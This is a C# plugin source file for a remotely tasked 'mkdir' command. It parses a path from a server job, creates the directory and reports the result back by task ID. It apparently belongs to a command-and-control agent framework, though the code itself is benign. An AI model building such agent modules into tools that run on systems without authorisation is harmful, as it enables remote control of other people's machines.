

using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "mkdir";
        private IDataBroker messageManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.tokenManager = context.TokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                if (args.ContainsKey("path"))
                {
                    DebugLog.Log($"{Name} creating '{args["path"]}' [{job.task.id}]");
                    DirectoryInfo dir = Directory.CreateDirectory(args["path"].Replace("\"", ""));

                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        completed = true,
                        user_output = "Created directory " + dir.FullName,
                        task_id = job.task.id,
                    });
                }
                else
                {
                    DebugLog.Log($"{Name} no path provided [{job.task.id}]");
                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        completed = true,
                        user_output = "No path provided.",
                        task_id = job.task.id,
                        status = "error"
                    });
                }
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} exception: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
                return;
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
